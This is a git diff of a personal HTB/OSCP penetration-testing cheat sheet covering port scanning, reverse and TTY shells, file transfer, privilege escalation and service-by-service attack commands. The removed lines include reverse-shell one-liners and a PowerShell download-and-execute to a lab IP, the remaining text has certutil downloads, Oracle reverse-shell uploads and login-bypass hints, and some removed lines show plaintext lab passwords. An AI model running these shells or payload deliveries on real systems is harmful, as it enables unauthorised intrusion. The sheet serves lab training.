@@ -1,34 +1,24 @@
 # Useful Commands for HTB/OSCP
-**Website**: https://IslandDog.ky
+> **Website**: https://IslandDog.ky
+> **Last Update**: 08/16/23
+> **Recent Changes**: Changes to multiple sections pulled from my Obsidian.
 
-**Last Update**: 07/12/23
-
-**Recent Changes**: Huge changes to multiple sections pulled from my Obsidian. I lied, I wasn't back =). I *might* be back now.
-
-## Required Links
-https://book.hacktricks.xyz/
-
-https://github.com/swisskyrepo/PayloadsAllTheThings
-
-https://gtfobins.github.io/
-
-https://lolbas-project.github.io/#
-
-https://www.exploit-db.com/
-
-https://www.exploit-db.com/google-hacking-database
-
-https://weibell.github.io/reverse-shell-generator/
-
-https://crackstation.net/
-
-https://gchq.github.io/CyberChef/
+## Useful Links
+https://exploit-notes.hdks.org/
+[https://book.hacktricks.xyz/](https://book.hacktricks.xyz/)
+https://ppn.snovvcrash.rocks/
+[https://github.com/swisskyrepo/PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings)
+[https://gtfobins.github.io/](https://gtfobins.github.io/)
+[https://lolbas-project.github.io/#](https://lolbas-project.github.io/#)
+[https://weibell.github.io/reverse-shell-generator/](https://weibell.github.io/reverse-shell-generator/)
+[https://crackstation.net/](https://crackstation.net/)
+[https://gchq.github.io/CyberChef/](https://gchq.github.io/CyberChef/)
 
 ## RustScan - #rustscan 
 ```bash
 #Intial
-echo 'export ip=10.10.11.168' > ~/.zshenv
-rustscan -a $ip && xsltproc scan -o intial-${PWD##*/}.html
+rustscan -a '' 
+xsltproc scan -o intial-${PWD##*/}.html
 #AllPorts
 sudo nmap -sC -sV -T4 -v -p- --script 'default,vuln' -oX scan-all $ip && xsltproc scan-all -o ${PWD##*/}-allports.html
 #UDP
@@ -36,53 +26,39 @@ sudo nmap -sU -sV --version-intensity 0 -F -n $ip -oX ${PWD##*/}-udp
 ```
 
 ## Reverse Shell #OneLiners
-```bash
-#Visit - https://weibell.github.io/reverse-shell-generator/
-bash -i >& /dev/tcp/10.0.0.1/1234 0>&1
-rm /tmp/h;mkfifo /tmp/h;cat /tmp/h|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/h
-{nc.tradentional|nc|ncat|netcat} 10.0.0.1 1234 {-e|-c} /bin/bash
-python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);s.close()'
-python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);os.putenv("HISTFILE","/dev/null");pty.spawn("/bin/bash");s.close()'
-powershell IEX(New-Object Net.webclient).downloadString('http://10.10.14.4/Invoke-ConPtyShell.ps1'); Invoke-ConPtyShell 10.10.14.4 9002
-```
+Go from memory or generate it from one of the many sites:
+https://github.com/0dayCTF/reverse-shell-generator
+https://weibell.github.io/reverse-shell-generator/
 
 ## TTY SHELLS #tty
 ```bash
-stty raw -echo; (stty size; cat) | nc -lvnp 9002
+#ConPtyShell
+stty raw -echo; (stty size; cat) | nc -lvnp 9001
+#Others
+pwncat-cs -lp 9001
+back
 export SHELL=bash
 export TERM=xterm OR export TERM=xterm-256color
 ```
-
-#tty_python
+### OnTheBox
 ```bash
+#tty_python
 python -c 'import pty; pty.spawn("/bin/bash")'
 python3 -c 'import pty; pty.spawn("/bin/bash")'
-```
-
 #tty_bash
-```bash
 echo os.system('/bin/bash')
-```
 #tty_sh
-```sh
 /bin/bash -i
-```
-
 #tty_perl
-```perl
 perl -e 'exec "/bin/bash"'
-```
-
 #tty_ruby
-```rb
 exec "/bin/bash"
-```
 #tty_lua
-```bash
 os.execute('/bin/bash')}
 ```
 
 ## File Uploading/Downloading #Windows #PowerShell #WGET #SMB 
+Use ```pwncat``` or ```evil-winrm``` as your preferred shell when possible!
 ```bash
 #https://github.com/egre55/ultimate-file-transfer-list
 #PowerShell Related
@@ -94,18 +70,14 @@ cscript wget.vbs http://10.0.0.1/file.exe FILEYOUNEED
 sudo smbserver.py -comment 'Transfer' smb smb
 #Use alongside curl/wget
 sudo python3 -m http.server 80
-sudo python -m SimpleHTTPServer 80
 #Windows based
 certutil.exe -urlcache -split -f "http://10.0.0.1/privesc/Powerless.bat" Powerless.bat
 scp <SOURCE_FILE> <USER>@${PWD##*/}:<DESTINATION_FILE>
 ```
 
-## PrivEsc Tools #PrivEsc #LinPEAS #WinPEAS #Powerless
+## PrivEsc Tools Windows #PrivEsc #LinPEAS #WinPEAS #Powerless
 ```bash
-./LinEnum.sh -s -r report -e /tmp/ -t
 winPEAS.bat/exe
-LinPeas.sh
-python suid3num.py
 Seatbelt.exe -group=all
 powershell -exec bypass -command "& { Import-Module .\PowerUp.ps1; Invoke-AllChecks; }"
 Powerless.bat
@@ -122,9 +94,11 @@ cat /etc/os-release
 #Check other networks running on the box
 ifconfig
 #Kernel Exploits #OS Exploits #Writable files owned by root that get executed (cronjobs)
-wget http://10.0.0.1/linpeas.sh | sh
-wget http://10.0.0.1/linenum.sh
+python suid3num.py
 #Password reuse (mysql, .bash_history, 000- default.conf...)
+./LinEnum.sh -s -r report -e /tmp/ -t
+./linpeas.sh -a -e -P 'SUDOPWIFYOUHAVEIT'
+pspy
 ```
 Updating with commands/references.
 ```txt
@@ -216,12 +190,12 @@ powershell.exe (New-Object System.Net.WebClient).DownloadFile('http://10.0.0.1/w
 ### 21 #FTP  
 ```bash
 #Anonymous logins
-ftp ${PWD##*/}
-nmap --script=ftp-anon,ftp-bounce,ftp-libopie,ftp-proftpd-backdoor,ftp-vsftpd-backdoor,ftp-vuln-cve2010-4221,tftp-enum -p 21 ${PWD##*/}
+ftp $ip
+nmap --script=ftp-anon,ftp-bounce,ftp-libopie,ftp-proftpd-backdoor,ftp-vsftpd-backdoor,ftp-vuln-cve2010-4221,tftp-enum -p 21 $ip
 ```
 
 ### 22 #SSH 
-CVE-2008-0166 - https://www.exploit-db.com/exploits/5720
+Normally for user/root access on CTF but check version available for exploits.
 
 ### 53 #DNS 
 ```bash
@@ -242,9 +216,8 @@ finger "|/bin/ls -a /$ip"
 
 ### 80/8080/443 #HTTP 
 #Visual
-```
-#Always intercept a request with Burp suite and check headers.
-```
+
+# Always intercept a request with Burp suite and check headers.
 ```bash
 curl -I $ip
 ```
@@ -254,10 +227,10 @@ curl -I $ip
 ```
 #DirectoryScan #FeroxBuster #HostScan #Logins
 ```bash
-#FeroxBuster requires my config or additional flags for threads/etc.
+#FeroxBuster requires my config or additional flags for threads/etc. Remember to tweak config depending on use case.
 #Use Raft - Words/Files/Directories.
-feroxbuster -u $ip -e -w /opt/SecLists/Discovery/Web-Content/raft-medium-words-lowercase.txt
-ffuf -b 'PHPSESSID=kn7hggb0pkp4nn9oin2dfs9mcu' -w /opt/seclists/Discovery/Web-Content/raft-medium-words-lowercase.txt  -u 'https://website.htb/admin/?FUZZ'
+feroxbuster -u $ip -e -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words-lowercase.txt
+ffuf -b 'PHPSESSID=kn7hggb0pkp4nn9oin2dfs9mcu' -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words-lowercase.txt  -u 'https://website.htb/admin/?FUZZ'
 #-p on nikto for specific ports.
 # -useproxy for Burp/Squid intercepts.
 nikto -host $ip -C all -o nikto-scan.html
@@ -265,9 +238,9 @@ nikto -host $ip -C all -o nikto-scan.html
 
 #sub-domain #domains
 ```bash
-gobuster vhost -u $ip -w /opt/seclists/Discovery/DNS/subdomains-top1million-5000.txt -t 50
+gobuster vhost -u '' -w /opt/seclists/Discovery/DNS/subdomains-top1million-5000.txt -t 50
 gobuster dns -d 'domain.htb' -w /opt/seclists/Discovery/DNS/subdomains-top1million-5000.txt -t 50
-ffuf -w /opt/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u 'domain.htb' -H "Host: FUZZ.domain.htb" -fw 1
+ffuf -w /opt/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u 'domain.htb' -H "Host: FUZZ.domain.htb"
 ```
 
 #SQL
@@ -308,9 +281,9 @@ git clone https://github.com/nccgroup/shocker; cd shocker; ./shocker.py -H ${PWD
 
 #CGI - Specific
 ```bash
-ffuf -w /opt/SecLists/Discovery/Web-Content/CGI-XPlatform.fuzz.txt -u http://${PWD##*/}/ccgi-bin/FUZZ -t 50
-ffuf -w /opt/SecLists/Discovery/Web-Content/CGIs.txt -u http://${PWD##*/}/ccgi-bin/FUZZ -t 50
-ffuf -w /opt/SecLists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -u http://${PWD##*/}/cgi-bin/FUZZ -e .sh,.pl,.cgi -t 100
+ffuf -w /opt/SecLists/Discovery/Web-Content/CGI-XPlatform.fuzz.txt -u http://domain.htb/ccgi-bin/FUZZ -t 50
+ffuf -w /opt/SecLists/Discovery/Web-Content/CGIs.txt -u http://domain.htb/ccgi-bin/FUZZ -t 50
+ffuf -w /opt/SecLists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -u http://domain.htb/cgi-bin/FUZZ -e .sh,.pl,.cgi -t 100
 ```
 
 #TOMCAT - Upload payload
@@ -332,16 +305,16 @@ curl http://${PWD##*/}:8080/shell/
 #GIT
 ```bash
 #Grab both from GitHub
-./gitdumper.sh http://${PWD##*/}/.git/ git
+./gitdumper.sh http://${PWD##*/}/ git
 ./extractor.sh git git-extracted
 ```
 
-#LFI/RFI - LoginForms - #SecLists Generic-SQLi.txt
+#LFI/RFI - LoginForms - #SecLists Generic-SQLi.txt mongodb_nosql.txt
 ```bash
+#Intercept a request with Burp and use ffuf to poke at the username/password. Change request Content-Type to application/json and try noSQL bypass.
 #https://raw.githubusercontent.com/carlospolop/Auto_Wordlists/main/wordlists
 #/opt/SecLists/Fuzzing/LFI/LFI-LFISuite-pathtotest-huge.txt
-ffuf -b 'PHPSESSID=kn7hggb0pkp4nn9oin2dfs9mcu' -w /opt/seclists/Fuzzing/LFI/LFI-Jhaddix.txt   -u 'https://website.htb/admin/?parameter=FUZZ' -fs 1712
-
+ffuf -b 'PHPSESSID=kn7hggb0pkp4nn9oin2dfs9mcu' -w /opt/seclists/Fuzzing/LFI/LFI-Jhaddix.txt   -u 'https://website.htb/admin/?parameter=FUZZ'
 ```
 
 #ImageUpload 
@@ -365,10 +338,8 @@ rpcinfo -p ${PWD##*/}
 #smbclient - Start here
 ```bash
 smbclient -N -L $ip
-smbclient -L \\\\${PWD##*/} -U 'Tiffany.Molina'
-smbclient -U 'tyler%92g!mA8BGjOirkL%OG*&' //${PWD##*/}/new-site -c 'put nc.exe nc.exe'
-smbclient -U 'administrator%u6!4ZwgwOM#^OBf#Nwnh'
-\\\\${PWD##*/}\\c$
+smbclient //$ip/ShareName
+\\\\$ip\\c$
 enum4linux -a -k none $ip
 ```
 #crackmapexec #password_spray
@@ -457,18 +428,18 @@ SQL> exec master..xp_dirtree '\\10.0.0.1\smb\'
 
 ### 1521 #Oracle
 ```bash
-python3 odat.py all -s ${PWD##*/} -p 1521
+python3 odat.py all -s $ip -p 1521
 mv ../www/shells/x64/rev-1234.exe .
-python3 odat.py utlfile -s ${PWD##*/} -p 1521 -U scott -P tiger -d XE --sysdba --putFile c:/ rev-1234.exe rev-1234.exe
-python3 odat.py externaltable -s ${PWD##*/} -p 1521 -U scott -P tiger -d XE --sysdba --exec c:/ rev-1234.exe
+python3 odat.py utlfile -s $ip -p 1521 -U scott -P tiger -d XE --sysdba --putFile c:/ rev-1234.exe rev-1234.exe
+python3 odat.py externaltable -s $ip -p 1521 -U scott -P tiger -d XE --sysdba --exec c:/ rev-1234.exe
 ```
 
 ### 2049 #NFS
 ```bash
-showmount -e ${PWD##*/}
-nmap --script=nfs-showmount ${PWD##*/}
-sudo mount -v -t nfs ${PWD##*/}:<SHARE> <DIRECTORY>
-sudo mount -v -t nfs -o vers=2 ${PWD##*/}:<SHARE> <DIRECTORY>
+showmount -e $ip
+nmap --script=nfs-showmount $ip
+sudo mount -v -t nfs $ip:<SHARE> <DIRECTORY>
+sudo mount -v -t nfs -o vers=2 $ip:<SHARE> <DIRECTORY>
 ```
 ### 3306 #MySQL
 ```bash
@@ -561,5 +532,5 @@ bloodhound-python -u UserName -p "PassWord" -ns 10.10.11.158 -d domain.htb -c al
 sudo neo4j start
 ```
 
-![[id.png|20x20]] IslandDog - Christopher Soehnlein 2021
+![[id.png|20x20]] IslandDog - Christopher Soehnlein 2023
 https://IslandDog.ky
